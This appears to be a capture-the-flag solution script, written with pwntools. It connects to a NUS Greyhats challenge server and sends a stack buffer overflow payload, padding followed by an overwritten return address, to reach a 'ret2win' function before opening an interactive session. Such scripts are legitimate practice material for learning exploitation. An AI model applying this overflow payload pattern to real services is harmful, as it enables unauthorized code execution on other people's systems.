HOST = "challs.nusgreyhats.org"
# HOST = "localhost"
PORT = 32831

from pwn import *

p = remote(HOST, PORT)
p.sendlineafter(b"input", b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\08\\16\\40\\00\\00\\00\\00\\00")

p.recvuntil(b"ret2win")
p.interactive()
